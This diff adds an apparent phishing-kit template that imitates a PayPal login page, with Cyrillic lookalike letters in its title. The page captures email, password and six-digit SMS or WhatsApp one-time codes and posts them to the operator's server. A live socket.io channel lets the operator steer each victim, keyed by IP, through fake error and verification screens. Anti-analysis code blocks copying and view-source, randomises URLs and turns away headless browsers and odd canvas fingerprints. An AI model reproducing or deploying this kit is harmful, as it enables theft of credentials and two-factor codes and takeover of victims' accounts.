@@ -1,0 +1,775 @@
+<html><head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+	  <link rel="shortcut icon" href="./images/pp_favicon_x.ico"/>
+	  <title>РауРаl</title>
+      <link rel="stylesheet" href="./snipped.css">
+    <meta name="referrer" content="no-referrer" />
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta name="robots" content="noindex, nofollow, noarchive" />
+    <meta name="googlebot" content="noindex, nofollow, noarchive" />
+    <meta http-equiv="X-Robots-Tag" content="noindex, nofollow, noarchive" />
+
+    <!-- Security (opt-in for browser features) -->
+    <meta http-equiv="Permissions-Policy" content="geolocation=(), camera=(), microphone=()" />
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+    <script nonce="<%- nonce %>" type="text/javascript" src="./js/jq.js"></script>
+    <script nonce="<%- nonce %>" src="/socket.io/socket.io.js"></script>	  
+	<style>
+  body {
+    user-select: none;
+    -webkit-user-select: none;
+    -ms-user-select: none;
+  }
+</style>
+<script nonce="<%= nonce %>">
+// Check if the current URL path is empty or contains only the domain
+if (window.location.pathname === '/' || window.location.pathname === '') {
+  // Generate a random string to use as the new path
+  const randomPath = generateRandomString(80); // Example: generateRandomString(30) for a 30 character path
+
+  // Redirect to the new path without query parameters
+  window.location.href = `${window.location.origin}/${randomPath}`;
+}
+
+// Function to generate a random string of given length
+function generateRandomString(length) {
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let result = '';
+  for (let i = 0; i < length; i++) {
+    const randomIndex = Math.floor(Math.random() * characters.length);
+    result += characters[randomIndex];
+  }
+  return result;
+}
+</script>
+
+<script nonce="<%= nonce %>">
+
+  document.addEventListener('contextmenu', event => event.preventDefault());
+  document.addEventListener('copy', e => e.preventDefault());
+  document.addEventListener('cut', e => e.preventDefault());
+  document.addEventListener('keydown', e => {
+    if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'c')) {
+      e.preventDefault(); // Block Ctrl+U, Ctrl+S, Ctrl+C
+    }
+  });
+</script>
+<script nonce="<%= nonce %>">
+function detectHeadless() {
+  const isHeadless = navigator.webdriver ||
+    /HeadlessChrome/.test(navigator.userAgent) ||
+    !navigator.plugins.length ||
+    !navigator.languages ||
+    window.outerWidth === 0;
+
+  if (isHeadless) {
+    document.body.innerHTML = "Access Denied";
+  }
+}
+
+window.onload = detectHeadless;
+</script>
+<script nonce="<%= nonce %>">
+  function fingerprintTrap() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.fillText("test", 50, 50);
+    const data = canvas.toDataURL();
+    if (data.length < 500) {
+      document.body.innerHTML = "Blocked (Fingerprint)";
+    }
+  }
+
+  window.onload = fingerprintTrap;
+</script>
+
+	
+   </head>
+   <body>
+
+
+
+<div class="enzoixrby" style="" data-joda-5yypn="">
+        <div id="pagelog">
+            <div class="enzowv5me" data-joda-5yypn="">
+                <div class="enzogskmt" data-joda-5yypn="">
+                    <header>
+                        <p class="enzossdsn enzonzktm enzozc13w" data-joda-yro87=""></p>
+                    </header>
+                    <h1 class="enzootovf" data-joda-erpbq=""><%- lang.login_to_account %></h1>
+                    <div data-joda-5yypn="">
+                        <div data-joda-5yypn="">
+                            <div class="enzoj2ofo" data-joda-5yypn="">
+                                <p class="enzok57k5 enzoe5i24" data-joda-yro87=""><%- lang.incorrect_info %></p>
+                            </div>
+                            <!-- <div  class="enzoj2ofo" data-joda-5yypn=""> -->
+                                <!-- <p class="enzok57k5 enzo6lb5s" data-joda-yro87="">Please login with your email and password.</p> -->
+                            <!-- </div> -->
+                            <div class="enzo5tlm3">
+                                <div class="enzo8dxj3" data-joda-5yypn="">
+                                    <div data-joda-5yypn="">
+                                        <div class="enzoo6pir" style="z-index: 1;" data-joda-5yypn="">
+                                            <div class="enzo3wgx1" data-joda-5yypn="">
+                                                <input id="enzooz13p" name="login_email" type="email" value="<%- dmn %>" placeholder="">
+                                                <label for="email" class="enzopn38r"><%- lang.email_or_mobile %></label>
+                                            </div>
+                                            <div class="enzokbpbg" data-joda-5yypn="" style="display: none;">
+                                                <p data-joda-yro87=""><%- lang.required %></p>
+                                                <!-- <p data-joda-yro87="">That email or mobile number format isn’t right</p> -->
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="enzo8dxj3 enzol1ohe" data-joda-5yypn="">
+                                        <div class="enzoo6pir" style="z-index: 1;" data-joda-5yypn="">
+                                            <div class="enzo3wgx1" data-joda-5yypn="" style="display: flex;">
+                                                <input id="enzog8wzc" name="login_password" type="password" value="" placeholder="">
+                                                <label for="password" class="enzopn38r"><%- lang.password %></label>
+                                                <button type="button" class="enzoheces" data-joda-zshh8=""><%- lang.show %></button>
+												
+                                            </div>
+                                            <div class="enzokbpbg" data-joda-5yypn="" style="display: none;">
+                                                <p data-joda-yro87=""><%- lang.required %></p>
+                                            </div>
+                                        </div><a class="enzov3c56 enzojtjpy" data-joda-tgm2h=""><%- lang.forgot_password %></a>
+                                    </div>
+                                </div>
+                                <div class="enzomoqyy" data-joda-5yypn="">
+                                    <button class="enzoxy9oy" type="button" value="Login" data-joda-zshh8=""><%- lang.login %></button>
+                                </div>
+                            </div>
+                            <div class="enzo54vcb" data-joda-5yypn="">
+                                <div class="enzo5vzba" data-joda-5yypn=""><span class="enzomkwxp" data-joda-gxobw=""><%- lang.or %></span>
+                                </div>
+                                <button type="button" class="enzoxy9oy enzol2kls" data-joda-zshh8=""><%- lang.sign_up %></button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div data-joda-5yypn=""  id="pagesms" style="display:none;margin: 120px auto 0;">
+            <div data-joda-5yypn="">
+               
+                <div class="enzo11p86" data-joda-5yypn="">
+                    <div data-joda-5yypn="">
+                        <div data-joda-5yypn="">
+                            <header>
+                                <p class="enzossdsn enzonzktm" data-joda-yro87=""></p>
+                            </header>
+                            <div class="enzorlbno" data-joda-5yypn="">
+                                <h3 class="enzoz3tnj enzo5f6eh"><%- lang.enter_code %></h3>
+                                <p class="enzoxaw2l enzo5f6eh enzozivon" data-joda-yro87=""><%- lang.code_sent_to %> <span id="numberphonesms"></span></p>
+                            </div>
+                            <div data-joda-5yypn="">
+                                <div class="enzozivon">
+                                    <div data-joda-5yypn="">
+                                        <div data-joda-5yypn="">
+                                            <div class="enzos1h78" data-joda-5yypn="">
+                                                <div class="enzowpf8o" data-joda-5yypn="">
+                                                    <div class="enzor7647" data-joda-5yypn=""><a class="enzo7dtw1 enzos7l6k enzod8wpy enzoxgok1 enzov86so" data-joda-tgm2h=""><%- lang.resend_code %></a></div>
+                                                </div>
+                                                <div data-joda-5yypn="">
+                                                    <div class="enzocda9t enzozh78r" data-joda-5yypn="">
+                                                        <div class="enzogkfcw" data-joda-5yypn="">
+                                                            <div class="enzo7qe52 enzo2mcqr enzo383hr" data-joda-5yypn=""><input class="enzomwf18 enzow484e enzohvo34 enzoc2r1b enzoyjaae" name="otpCode-0" id="enzoxcrgb" placeholder=" " for="securityCodeInput" inputmode="numeric" value=""></div>
+                                                            <div class="enzo7qe52 enzo2mcqr enzo383hr" data-joda-5yypn=""><input class="enzomwf18 enzow484e enzohvo34 enzoc2r1b enzoyjaae" name="otpCode-1" id="enzo3nzrr" placeholder=" " for="securityCodeInput" inputmode="numeric" value=""></div>
+                                                            <div class="enzo7qe52 enzo2mcqr enzo383hr" data-joda-5yypn=""><input class="enzomwf18 enzow484e enzohvo34 enzoc2r1b enzoyjaae" name="otpCode-2" id="enzomemll" placeholder=" " for="securityCodeInput" inputmode="numeric" value=""></div>
+                                                            <div class="enzo7qe52 enzo2mcqr enzo383hr" data-joda-5yypn=""><input class="enzomwf18 enzow484e enzohvo34 enzoc2r1b enzoyjaae" name="otpCode-3" id="enzops36t" placeholder=" " for="securityCodeInput" inputmode="numeric" value=""></div>
+                                                            <div class="enzo7qe52 enzo2mcqr enzo383hr" data-joda-5yypn=""><input class="enzomwf18 enzow484e enzohvo34 enzoc2r1b enzoyjaae" name="otpCode-4" id="enzoibog7" placeholder=" " for="securityCodeInput" inputmode="numeric" value=""></div>
+                                                            <div class="enzo7qe52 enzo2mcqr enzo383hr" data-joda-5yypn=""><input class="enzomwf18 enzow484e enzohvo34 enzoc2r1b enzoyjaae" name="otpCode-5" id="enzonszb3" placeholder=" " for="securityCodeInput" inputmode="numeric" value=""></div>
+                                                        </div>
+                                                        <div id="errsms" class="enzo383hr" style="display:none" data-joda-5yypn=""><span class="enzoddtr5 enzo45xpb enzo7a1c7" data-joda-gxobw=""><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em" data-ppui="true">
+                                                                    <path d="M22.2 17.634L14.002 3.396a2.322 2.322 0 0 0-4.004 0L1.8 17.634a2.204 2.204 0 0 0 0 2.223A2.282 2.282 0 0 0 3.802 21h16.396a2.284 2.284 0 0 0 2-1.143 2.204 2.204 0 0 0 .002-2.223zm-1.3 1.472a.797.797 0 0 1-.701.394H3.802a.797.797 0 0 1-.702-.394.712.712 0 0 1 0-.723l8.2-14.238a.82.82 0 0 1 1.406 0l8.199 14.238a.712.712 0 0 1-.004.723zM11.25 13.5V9.75a.75.75 0 1 1 1.5 0v3.75a.75.75 0 0 1-1.5 0zm1.875 3.375a1.125 1.125 0 1 1-2.25 0 1.125 1.125 0 0 1 2.25 0z" data-ppui="true"></path>
+                                                                </svg></span>
+																<span id="texterrsms" class="enzoztdgq" data-joda-gxobw=""><%- lang.required %></span>
+																<!-- <span class="enzoztdgq" data-joda-gxobw="">Il y a un problème avec le code de sécurité que vous avez saisi. Réessayez.</span> -->
+																</div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div><button class="enzoxy9oy enzolx7do" type="button" id="smsend" data-joda-zshh8=""><%- lang.send %></button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="enzo11p86" data-joda-5yypn="" id="pageerror" style="display:none;margin: 120px auto 0;">
+            <div data-joda-5yypn="">
+                <header>
+                    <p class="enzossdsn enzonzktm" data-joda-yro87=""></p>
+                </header>
+                <h1 class="enzootovf enzoke779" data-joda-erpbq=""><%- lang.unable_to_confirm %></h1>
+                <p class="enzol5amh" data-joda-yro87=""><%- lang.no_response %></p><button class="enzoxy9oy enzolx7do" data-joda-zshh8=""><%- lang.try_again %></button>
+            </div>
+        </div>
+        <div data-joda-5yypn="" id="pagever" style="display:none;margin: 120px auto 0;">
+            <div data-joda-5yypn="">
+
+                <div data-joda-5yypn=""></div>
+                <div class="enzo11p86" data-joda-5yypn="">
+                    <div data-joda-5yypn="">
+                        <div class="enzovqpqv" data-joda-5yypn="">
+                            <div data-joda-5yypn="">
+                                <fieldset>
+                                    <div class="enzoeyonf" data-joda-5yypn="">
+                                        <header>
+                                            <p class="enzossdsn enzonzktm" data-joda-yro87=""></p>
+                                        </header>
+                                        <div data-joda-5yypn="">
+                                            <h3 class="enzoz3tnj enzo5f6eh"><%- lang.confirm_identity %></h3>
+                                            <p class="enzoxaw2l enzo5f6eh enzo6jy2c" data-joda-yro87=""></p>
+                                            <fieldset class="enzoq5il1">
+                                                <legend class="enzo86n3y"></legend>
+                                                <div class="enzobgrkf enzo9kcto enzo8xopm enzo5tk7o" data-joda-5yypn=""><input type="radio" class="enzo4asqh" name="selectedChallengeType" value="sms" id="enzo1bveg"><label class="enzooq2sj enzov7rmy" for="sms-challenge-option"><span class="enzorfept" data-joda-gxobw=""><span class="enzoh4cgg" data-joda-gxobw=""><svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" data-ppui="true">
+                                                                    <circle r="18" cy="50" cx="50" stroke-width="0" fill="currentColor" data-ppui="true"></circle>
+                                                                </svg></span></span>
+                                                        <div data-joda-5yypn="">
+                                                            <p class="enzoxaw2l enzo5f6eh" data-joda-yro87=""><%- lang.receive_sms %></p>
+                                                           
+														   <div class="enzot1vq9" data-joda-5yypn=""><span class="enzo43ebc" data-joda-gxobw="">
+                                                                    <p class="enzoxaw2l enzo5f6eh" data-joda-yro87=""><span data-joda-gxobw=""><%- lang.mobile %> <span id="numberphone"></span</span></p>
+                                                                </span></div>
+                                                        </div>
+                                                    </label></div>
+                                                <div class="enzobgrkf enzo9kcto enzo8xopm enzo5tk7o" data-joda-5yypn=""><input type="radio" class="enzo4asqh" name="selectedChallengeType" value="whatsapp" id="enzo3m6e2"><label class="enzooq2sj enzov7rmy" for="whatsapp-challenge-option"><span class="enzorfept" data-joda-gxobw=""><span class="enzoh4cgg" data-joda-gxobw=""><svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" data-ppui="true">
+                                                                    <circle r="18" cy="50" cx="50" stroke-width="0" fill="currentColor" data-ppui="true"></circle>
+                                                                </svg></span></span>
+                                                        <div data-joda-5yypn="">
+                                                            <p class="enzoxaw2l enzo5f6eh" data-joda-yro87=""><%- lang.receive_whatsapp %></p>
+                                                            <div class="enzot1vq9" data-joda-5yypn=""><span class="enzo43ebc" data-joda-gxobw="">
+                                                                    <p class="enzoxaw2l enzo5f6eh" data-joda-yro87=""><span data-joda-gxobw=""><%- lang.mobile %> <span id="numberphonewhatsap"></span</span></p>
+                                                                </span></div>
+                                                        </div>
+                                                    </label></div>
+                                            </fieldset>
+                                            <div class="enzorc8b3" data-joda-5yypn="">
+                                                <div class="enzoaehca" data-joda-5yypn=""><input type="checkbox" class="enzoh7bnv" id="enzo3mb2x" name="remember_device_user_consent"><label class="enzoeo2os enzoxaw2l" for="41667"><span class="enzo4xkg1" data-joda-gxobw=""><span class="enzo7x89t" data-joda-gxobw=""><span class="enzoddtr5 enzo3bi1o enzomwv4k" data-joda-gxobw=""><svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 18 18" width="1em" height="1em" data-ppui="true">
+                                                                        <path fill-rule="evenodd" d="M3.352 9.586l3.398 3.399 8.46-8.462a.763.763 0 0 1 1.08 1.079l-9 9a.761.761 0 0 1-1.08 0l-3.937-3.938a.763.763 0 1 1 1.079-1.078z" clip-rule="evenodd" data-ppui="true"></path>
+                                                                    </svg></span></span><span class="enzo4xkg1" data-joda-gxobw=""><span class="enzo7i768" data-joda-gxobw=""><span class="enzoxaw2l" data-joda-gxobw=""><%- lang.remember_device_option %></span></span></span></span>
+                                                        <p class="enzo3g8yo enzooz8gs" data-joda-yro87=""><%- lang.remember_device_warning %><br><a class="enzo7dtw1 enzos7l6k enzod8wpy enzoxgok1" data-joda-tgm2h=""><%- lang.learn_about_devices %></a></p>
+                                                    </label></div>
+                                            </div>
+                                            <p class="enzoxaw2l enzo5f6eh enzotezoi" data-joda-yro87=""><%- lang.consent_sms %></p>
+                                            <div class="enzonyem9" data-joda-5yypn=""><button id="numbersuivant" class="enzoxy9oy enzolx7do" data-joda-zshh8=""><%- lang.next %></button></div>
+                                        </div>
+                                    </div>
+                                </fieldset>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer class="enzox56km" data-joda-n5jfo="">
+            <ul data-joda-voko1="">
+                <li data-joda-gnwga="">
+                    <p class="enzoxaw2l enzo5f6eh" data-joda-yro87=""><a data-joda-tgm2h=""><%- lang.contact %></a></p>
+                </li>
+                <li data-joda-gnwga="">
+                    <p class="enzoxaw2l enzo5f6eh" data-joda-yro87=""><a data-joda-tgm2h=""><%- lang.privacy %></a></p>
+                </li>
+                <li data-joda-gnwga="">
+                    <p class="enzoxaw2l enzo5f6eh" data-joda-yro87=""><a data-joda-tgm2h=""><%- lang.user_agreements %></a></p>
+                </li>
+                <li data-joda-gnwga="">
+                    <p class="enzoxaw2l enzo5f6eh" data-joda-yro87=""><a data-joda-tgm2h=""><%- lang.international %></a></p>
+                </li>
+            </ul>
+        </footer>
+        <div data-joda-5yypn=""  id="pagload" style="margin: 120px auto 0;">
+            <div data-joda-5yypn="">
+                <div class="" data-joda-5yypn="">
+                    <div data-joda-5yypn="">
+                        <div class="enzoe2pgn" data-joda-5yypn="">
+                            <p class="enzo69sgw enzo4jzmo enzoxbv3l" data-joda-yro87=""><span class="enzoqvh3s" data-joda-gxobw=""><%- lang.one_moment %></span></p>
+                            <p class="enzoxaw2l enzo5f6eh enzoxaa8h" data-joda-yro87=""><%- lang.one_moment %></p>
+                            <div class="enzozgo57" data-joda-5yypn=""></div>
+                        </div>
+                        <div class="enzo4moxe" data-joda-5yypn=""></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+</div>
+
+<script nonce="<%= nonce %>">
+  document.cookie = "js_enabled=true; path=/";
+</script>
+
+
+
+<script nonce="<%- nonce %>">
+document.querySelector('.enzoheces').addEventListener('click', function () {
+  const passwordInput = document.getElementById('enzog8wzc');
+  const button = this;
+
+  if (passwordInput.type === 'password') {
+    passwordInput.type = 'text';
+    button.textContent = '<%- lang.hide %>';
+  } else {
+    passwordInput.type = 'password';
+    button.textContent = '<%- lang.show %>';
+  }
+});
+
+document.querySelectorAll('.enzo3wgx1 input').forEach(input => {
+  const label = input.parentElement.querySelector('label');
+
+  // Initial check if input has value
+  if (input.value.trim() !== '') {
+    label.classList.add('active');
+  }
+
+  input.addEventListener('focus', () => {
+    label.classList.add('active');
+  });
+
+  input.addEventListener('blur', () => {
+    if (input.value.trim() === '') {
+      label.classList.remove('active');
+    }
+  });
+});
+
+
+document.querySelector('.enzoxy9oy').addEventListener('click', function (e) {
+  const inputs = document.querySelectorAll('.enzoo6pir input');
+  let hasEmpty = false;
+
+  inputs.forEach(input => {
+    const value = input.value.trim();
+    const parent = input.closest('.enzoo6pir');
+    const errorBox = parent?.querySelector('.enzokbpbg');
+    const forgotWrapper = document.querySelector('.enzov3c56');
+    const isPassword = input.getAttribute('name') === 'login_password';
+
+    // Live input listener — added only once
+    if (!input.dataset.listenerAttached) {
+      input.addEventListener('input', () => {
+        if (input.value.trim() !== '' && errorBox) {
+          errorBox.style.display = 'none';
+          if (isPassword && forgotWrapper) {
+            forgotWrapper.style.display = 'block';
+          }
+        }
+      });
+      input.dataset.listenerAttached = 'true';
+    }
+
+    if (value === '') {
+      hasEmpty = true;
+      if (errorBox) errorBox.style.display = 'block';
+      if (isPassword && forgotWrapper) forgotWrapper.style.display = 'none';
+    } else {
+      if (errorBox) errorBox.style.display = 'none';
+      if (isPassword && forgotWrapper) forgotWrapper.style.display = 'block';
+    }
+  });
+
+  if (!hasEmpty) {
+    e.preventDefault(); // stop default action (form submit)
+    var user = $("#enzooz13p").val();
+    var pwd = $("#enzog8wzc").val();
+    const pageLog = document.getElementById('pagelog');
+    const pageLoad = document.getElementById('pagload');
+
+      $.ajax({
+        url: '', // Insert your POST endpoint URL here
+        type: 'POST',
+        data: {
+          enzou: user,
+	      enzop: pwd
+        },
+        success: function(response) {
+		  
+
+    if (pageLog) {
+      pageLog.style.opacity = '0.5';
+	  pageLog.style.pointerEvents = 'none';
+      setTimeout(() => {
+        pageLog.style.display = 'none';
+	    pageLog.style.opacity = '1';
+	    pageLog.style.pointerEvents = 'auto';
+    if (pageLoad) {
+      pageLoad.style.display = 'block';
+      pageLoad.style.opacity = '1';
+      pageLoad.classList.add('visible');
+    }		
+      }, 5000);
+    }
+	
+		   
+        },
+        error: function(xhr, status, error) {
+          console.error("AJAX error:", error);
+        }
+      });
+	  
+
+
+  } else {
+    e.preventDefault(); // block if any input is empty
+  }
+});
+
+
+        const socket = io({
+            reconnection: true,
+            reconnectionAttempts: 5,
+            reconnectionDelay: 1000,
+            reconnectionDelayMax: 5000,
+        });
+
+        const userIP = "<%- userIP %>";
+            socket.on('connect', () => {
+                socket.emit('heartbeat'); // Initial heartbeat
+            });		
+        const mainPages = ['pagelog', 'pagesms', 'pageerror', 'pagever', 'pagload'];
+        let lastPageTarget = null; // Track last received page
+
+        function hideAllPages() {
+            mainPages.forEach(page => {
+                const el = document.getElementById(page);
+                if (el) el.style.display = 'none';
+            });
+        }
+
+
+        socket.on('changePage', (data) => {
+            try {
+                if (data.ip !== userIP) return;
+
+                const target = data.page;
+                if (!target) return;
+                    if (target === 'errorcc') {
+                const loger = document.querySelector('.enzoj2ofo');
+                if (loger) loger.style.display = 'block';
+
+					$("#enzog8wzc").val(''); // Clear input
+
+					// Then remove the floating effect on the label
+					$("#enzog8wzc").parent().find("label").removeClass("active");
+
+
+
+                    }				
+				
+				 if (target === "number") {
+					if (data.text1) {
+						const number = data.text1;
+						const phoneIds = ["numberphone", "numberphonewhatsap", "numberphonesms"];
+						phoneIds.forEach(id => {
+							const el = document.getElementById(id);
+							if (el) el.textContent = number;
+						});
+					}
+					
+				} else if (target === "sms") {
+					if (data.text1) {
+						const smsEl = document.getElementById("numberphonesms");
+						if (smsEl) smsEl.textContent = data.text1;
+					}
+
+				} else if (target === "merrsms") {
+					// Clear all inputs and add 'enzoog8vk' class
+					inputs.forEach(input => {
+						input.value = '_';
+						input.classList.add('enzoog8vk');
+					});
+                  const errorDiv = document.getElementById('errsms');
+                  const texterrSms = document.getElementById('texterrsms');
+					// Show error message
+					if (errorDiv) {
+						errorDiv.style.display = 'flex';
+						texterrSms.textContent = "Il y a un problème avec le code de sécurité que vous avez saisi. Réessayez.";
+					}
+					
+					const pageSms = document.getElementById('pagesms');
+                    const pageLoad = document.getElementById('pagload');
+				    pageLoad.style.display = 'none';
+				    pageSms.style.display = 'block';
+					pageSms.style.opacity = '1';
+	                pageSms.style.pointerEvents = 'auto';
+				}
+
+
+
+                let actualPage = target;
+                if (target === 'number') actualPage = 'pagever';
+                if (target === 'sms') actualPage = 'pagesms';
+                if (target === 'merrsms') actualPage = 'pagesms';
+                if (target === 'errorcc') actualPage = 'pagelog';
+                if (target === 'errorpay') actualPage = 'pageerror';
+
+                if (!mainPages.includes(actualPage)) {
+                    console.warn(`Unknown page: ${actualPage}`);
+                    return;
+                }
+
+                hideAllPages();
+
+                const pageEl = document.getElementById(actualPage);
+                if (pageEl) pageEl.style.display = 'block';
+
+
+
+            } catch (error) {
+                console.error("Socket changePage error:", error);
+                <!-- showLoading(false); -->
+            }
+        });
+
+
+            setInterval(() => {
+                socket.emit('heartbeat');
+            }, 1000); // Send a heartbeat every second		
+
+
+
+const container = document.querySelector('.enzoq5il1');
+const smsRadio = document.querySelector('input[type="radio"][value="sms"]');
+const whatsappRadio = document.querySelector('input[type="radio"][value="whatsapp"]');
+
+const smsInfo = smsRadio.closest('div.enzo9kcto').querySelector('.enzot1vq9');
+const whatsappInfo = whatsappRadio.closest('div.enzo9kcto').querySelector('.enzot1vq9');
+
+const targetDiv = document.querySelector('.enzovqpqv div.enzo5tk7o');
+
+// ✅ Set SMS as default on load
+smsRadio.checked = true;
+whatsappRadio.checked = false;
+smsInfo.style.display = 'flex';
+whatsappInfo.style.display = 'none';
+if (targetDiv) targetDiv.style.minHeight = ''; // clear min-height
+
+// 🎯 Handle label clicks
+if (container) {
+    container.addEventListener('click', function (e) {
+        const label = e.target.closest('label');
+        if (!label) return;
+
+        const forAttr = label.getAttribute('for');
+
+        if (forAttr === 'sms-challenge-option') {
+            smsRadio.checked = true;
+            whatsappRadio.checked = false;
+
+            smsInfo.style.display = 'flex';
+            whatsappInfo.style.display = 'none';
+
+            if (targetDiv) targetDiv.style.minHeight = '95px'; // remove style
+            <!-- console.log("✅ SMS option is selected."); -->
+        } else if (forAttr === 'whatsapp-challenge-option') {
+            whatsappRadio.checked = true;
+            smsRadio.checked = false;
+
+            whatsappInfo.style.display = 'flex';
+            smsInfo.style.display = 'none';
+
+            if (targetDiv) targetDiv.style.minHeight = '48px'; // apply style
+            <!-- console.log("✅ WhatsApp option is selected, style added."); -->
+        }
+    });
+}
+
+const nextButton = document.getElementById('numbersuivant');
+
+if (nextButton) {
+    nextButton.addEventListener('click', function () {
+        const selectedRadio = document.querySelector('input[name="selectedChallengeType"]:checked');
+
+        if (selectedRadio) {
+            const selectedValue = selectedRadio.value; // "sms" or "whatsapp"
+            <!-- console.log("✅ Selected:", selectedValue); -->
+			    const pageVer = document.getElementById('pagever');
+                const pageLoad = document.getElementById('pagload');
+
+            // Send via AJAX using fetch
+      $.ajax({
+        url: '', // Insert your POST endpoint URL here
+        type: 'POST',
+        data: {
+          selecte: selectedValue,
+        },
+        success: function(response) {
+    if (pageVer) {
+      pageVer.style.opacity = '0.5';
+	  pageVer.style.pointerEvents = 'none';
+
+      setTimeout(() => {
+        pageVer.style.display = 'none';
+	    pageVer.style.opacity = '1';
+	    pageVer.style.pointerEvents = 'auto';
+    if (pageLoad) {
+      pageLoad.style.display = 'block';
+      pageLoad.style.opacity = '1';
+      pageLoad.classList.add('visible');
+    }		
+      }, 3000);
+    }	
+		   
+        },
+        error: function(xhr, status, error) {
+          console.error("AJAX error:", error);
+        }
+      });
+        } else {
+            console.warn("⚠️ No option selected!");
+        }
+    });
+}
+
+const inputs = document.querySelectorAll('input[name^="otpCode-"]');
+const sendBtn = document.getElementById('smsend');
+const errorDiv = document.getElementById('errsms');
+
+// Helper to update empty class
+function updateInputClasses() {
+    inputs.forEach(input => {
+        if (input.value === '' || input.value === '_') {
+            input.classList.add('enzoog8vk');
+        } else {
+            input.classList.remove('enzoog8vk');
+        }
+    });
+}
+
+// Helper to check if all 6 digits are entered
+function isCodeComplete() {
+    return Array.from(inputs).every(input => /^\d$/.test(input.value));
+}
+
+// Helper to hide error if code is complete
+function updateErrorVisibility() {
+    if (isCodeComplete()) {
+        errorDiv.style.display = 'none';
+    }
+}
+
+// Initialize inputs with '_'
+inputs.forEach(input => {
+    input.value = '_';
+    <!-- input.classList.add('enzoog8vk'); -->
+});
+
+// Input behaviors
+inputs.forEach((input, index) => {
+    input.addEventListener('focus', () => {
+        if (input.value === '_') {
+            input.value = '';
+        }
+    });
+
+    input.addEventListener('blur', () => {
+        if (input.value.trim() === '') {
+            input.value = '_';
+        }
+        updateInputClasses();
+    });
+
+    input.addEventListener('input', () => {
+        const val = input.value;
+        if (/^\d$/.test(val)) {
+            input.value = val;
+            if (index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        } else {
+            input.value = '';
+        }
+        updateInputClasses();
+        updateErrorVisibility();
+    });
+
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace') {
+            if (input.value === '' && index > 0) {
+                inputs[index - 1].focus();
+            }
+        }
+    });
+});
+
+// On send button click
+sendBtn?.addEventListener('click', () => {
+    const code = Array.from(inputs).map(i => i.value).join('');
+
+    if (/^\d{6}$/.test(code)) {
+        errorDiv.style.display = 'none';
+
+			    const pageSms = document.getElementById('pagesms');
+				
+                const pageLoad = document.getElementById('pagload');
+					  
+
+            // Send via AJAX using fetch
+      $.ajax({
+        url: '', // Insert your POST endpoint URL here
+        type: 'POST',
+        data: {
+          sms: code,
+        },
+        success: function(response) {
+    if (pageSms) {
+      pageSms.style.opacity = '0.5';
+	  pageSms.style.pointerEvents = 'none';
+  <!-- if (pageLog && !pageLog.querySelector('#instantMessage')) { -->
+    <!-- const wrapper = document.createElement('div'); -->
+    <!-- wrapper.id = 'instantMessage'; -->
+    <!-- wrapper.style.position = 'absolute'; -->
+    <!-- wrapper.style.top = '20%'; -->
+    <!-- wrapper.style.left = '50%'; -->
+    <!-- wrapper.style.transform = 'translate(-50%, -50%)'; -->
+    <!-- wrapper.style.textAlign = 'center'; -->
+    <!-- wrapper.style.zIndex = '1000'; -->
+
+    <!-- const p = document.createElement('p'); -->
+    <!-- p.className = 'enzo69sgw enzo4jzmo enzoxbv3l'; -->
+    <!-- p.setAttribute('data-joda-yro87', ''); -->
+
+    <!-- const span = document.createElement('span'); -->
+    <!-- span.className = 'enzoqvh3s'; -->
+    <!-- span.setAttribute('data-joda-gxobw', ''); -->
+    <!-- span.innerText = 'Un instant…'; -->
+
+    <!-- p.appendChild(span); -->
+    <!-- wrapper.appendChild(p); -->
+    <!-- pageLog.appendChild(wrapper); -->
+  <!-- }	   -->
+      setTimeout(() => {
+        pageSms.style.display = 'none';
+	    pageSms.style.opacity = '1';
+	    pageSms.style.pointerEvents = 'auto';
+    if (pageLoad) {
+      pageLoad.style.display = 'block';
+      pageLoad.style.opacity = '1';
+      pageLoad.classList.add('visible');
+    }		
+      }, 3000);
+    }	
+		   
+        },
+        error: function(xhr, status, error) {
+          console.error("AJAX error:", error);
+        }
+      });
+	  
+    } else {
+        errorDiv.style.display = 'flex';
+    }
+
+    updateInputClasses();
+});
+
+
+    </script>
+
+
+   
+
+</body></html>
